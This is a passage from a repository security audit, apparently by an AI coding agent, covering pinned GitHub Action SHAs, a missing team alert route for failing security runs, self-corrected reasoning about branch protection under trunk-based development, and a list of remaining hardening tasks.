Installing the scanners made the pre-push gate real for the first time, and its
**first run blocked**: `semgrep` flagged four mutable action references in
`.github/workflows/security.yml` (`actions/checkout@v6` ×3,
`gitleaks/gitleaks-action@v3`) under
`github-actions-mutable-action-tag` — a tag the action owner can silently
repoint, the vector behind the real `trivy-action` and `kics-github-action`
compromises. That the *security* workflow carried the supply-chain defect is
the point worth keeping.

Fixed: both tags resolved via the GitHub API (verified as lightweight tags
pointing directly at commits, so no annotated-tag dereference was needed) and
pinned to full 40-character SHAs with the version retained as a trailing
comment. Re-verified: `semgrep … --error` now exits 0, `gitleaks detect` over
all 62 commits reports no leaks.

## 4c. A-37 (NEW) — no configured team alert route for a failing `security` run

**Corrected scope (founder, 2026-07-24).** This finding was first written as
"`main` is unprotected, so the enforcing layer is missing." That framing was
wrong, and the reason is worth recording because it is a cross-stream hazard.

The redcare stream reframed my A-22 residual gap as a layer assignment — local
hook = advisory feedback, CI required-checks = the real gate — and I adopted it
and audited against it. **That reframe fits their collaboration model: redcare
works through PRs, so required status checks gate the merge.** This repo is
**trunk-based by design** (CLAUDE.md: no branches, direct push to `main`).

**Second correction (Slava, four-eyes R6) — and this one corrects me, not the
first framing.** I wrote that required checks "enforce at merge time" and then,
rescoping, that the mechanism "structurally does not apply" to trunk-based.
**Both are false, and the second is just the first in new words.** GitHub
documents required checks as blocking **pushes** to a protected branch, not
only merges; and it documents a direct-push path — a commit whose exact SHA is
up to date and has already passed the required checks can be pushed straight to
the protected branch. So enforcement *is* technically available here.

What actually conflicts is narrower and is a **policy** conflict, not a
structural one: to get checks to run on a SHA before it reaches `main`, that
SHA must first exist on some other ref, and this repo's rule is **no branches**.
So the enforcing options are:

1. **Short-lived PRs** — real enforcement; contradicts the no-branches rule and
   changes how the whole team works.
2. **Stage the exact SHA on a temporary ref, wait for required checks, then push
   that already-green SHA directly to a protected `main`** — real enforcement,
   keeps `main` linear and direct-pushed, but still requires a ref to stage on,
   so it bends the same rule more cheaply. Also needs the workflow to trigger on
   that staging ref; today it only listens to `main` pushes and `pull_request`,
   which is why no check can currently run for an unpushed local SHA.
3. **Accept advisory-only enforcement and fix the detection layer** — below.

An unprotected `main` is therefore a *live trade the founder owns*, not an
impossibility. I twice reached for "this cannot be done here" when the true
answer was "this costs something here", which is a materially different claim to
put in front of a decision-maker.

**Independently of that trade, the detection layer is broken and should be
fixed either way.** Even with option 1 or 2 adopted, a red run still has to
reach someone. Verified:

- `.github/workflows/security.yml` runs on every push and nightly (`gh run
  list` — not redcare's BUG-018 shape, where a workflow had never once
  started).
- It has **no configured failure routing**: no `if: failure()` step, no Slack
  webhook, no declared alert destination. Grep confirms zero. (GitHub's own
  per-user run notifications are unaffected by this — they are not a
  team-visible route and are not what capability #3 asks for.)

**That is the actual finding, stated precisely:** there is **no configured
shared/team alert and no transition-edge failure route**. Not "nobody finds
out" — GitHub does send individual notifications for runs a user triggers, and
routes scheduled-workflow failures to the workflow's designated user, though
delivery depends on that person's notification settings. What does not exist is
any *team-visible, configured* destination, which is what the observability
capability actually requires.

Severity differs by option. Under options 1 and 2 a failing required check
already blocks the push or merge, giving synchronous feedback on the change
being attempted — the alert is still needed for failures *outside* that path,
above all the nightly CVE scan, which by definition fires when nobody is
pushing. Under option 3 the alert is the only automated detection after a bad
commit has landed, so its absence is most severe there.

This violates the project's own
non-negotiable observability capability #3 (CLAUDE.md §"Observability is a main
concern": *every shipped capability is alertable when it starts failing*) —
the security gate is a shipped capability and it is not alertable.

**Fix direction** (not applied — see below): an `if: failure()` step routing to
the same Slack lane as the other observability alerts, on the transition edge
rather than every run. Optionally an auto-revert of the offending commit on
`main`, which trunk-based makes cheap because there is no branch to reconcile.

**Why option 3 is defensible rather than a cop-out.** Trunk-based trades
pre-merge blocking for fast feedback plus fix-forward. That trade is coherent
*provided the feedback actually arrives* — which is precisely the leg that is
missing. Adding the alert makes the model whole; it does not make it PR-based.
That is an argument for option 3 being viable, **not** an argument that options
1 and 2 are unavailable — which is the error corrected above.

**Blueprint-level consequence, worth the founder's attention.** CLAUDE.md
mandates trunk-based generically, but derived projects do not all follow it —
redcare collaborates via PRs. That means **patterns arriving from the redcare
stream may silently assume a PR flow**, and this one did. I adopted their
reframe and audited my repo against a mechanism shaped for their PR flow, then
compounded it by concluding the mechanism was unavailable rather than merely
costly here (corrected above, R6). Both errors needed someone else to catch. Cross-stream
patterns need their collaboration-model assumption stated before adoption —
the same discipline already applied to flagging divergent defaults.

## 5. Next up

All four questions from the first pass are answered (§3b). Remaining, in the
agreed "guard the pipe first" order:

1. **A-05** — bootstrap copies the working tree; switch to `git archive HEAD`.
   Highest value: it is the `.env`/`SONAR_TOKEN` leak path.
2. **A-07** — add the contamination guard + reverse-substitution to
   `cmd_a2bp`, and a "Step A0 — contamination sweep" to `A2BP_PLAYBOOK.md`.
   This is the vector that created BUG-002.
3. **A-15** — wire `tests/marker-merge/test.sh` into a blueprint
   `.githooks/pre-push-project` (~2 s, well inside the 30 s ceiling), and
   extend it to cover A-11 (misordered markers silently delete content).
4. **A-02 / A-03** — install the scanners; fix the `gitleaks protect --staged`
   invocation to scan the outgoing range.
5. **A-27** — add `project_config_security.md` + `project_config_infra.md` to
   `.gitignore`. One line, and it is a live exposure.
6. **Then** BUG-001 (needs the plan revised to Codex's offset-supervisor
   design first, plus A-06 folded in) and BUG-002 — for which
   `rdc-agenticcoding-blueprint` already holds the better fix (§2 of the
   inherited-audit doc there).

**Still open:** the derived repos beyond redcare (`greenwashing-detection-agent`,
`storm2flow`, `linkedin-watcher-agent`) have not been swept — all have drifted
(33/120/112 lines) and the same `a2bp` vector applies in both directions.
